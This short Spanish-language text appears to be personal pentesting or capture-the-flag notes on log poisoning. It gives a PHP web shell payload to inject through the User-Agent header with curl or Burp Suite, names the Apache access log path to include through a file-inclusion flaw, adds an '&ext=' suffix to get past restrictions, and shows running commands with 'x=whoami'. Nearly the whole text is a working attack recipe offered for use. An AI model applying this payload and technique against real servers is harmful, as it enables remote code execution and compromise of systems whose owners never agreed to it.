en el user agent con -A <?php system(\$_GET['x']); ?>
O directamente con burpsuite en el user agent
Cuando accedemos a:
/var/log/apache2/access.log
O para saltar restircciones:
/var/log/apache2/access.log&ext=

Siempre poniendo despues de lo de arriba el x=whoami o el &x=whoami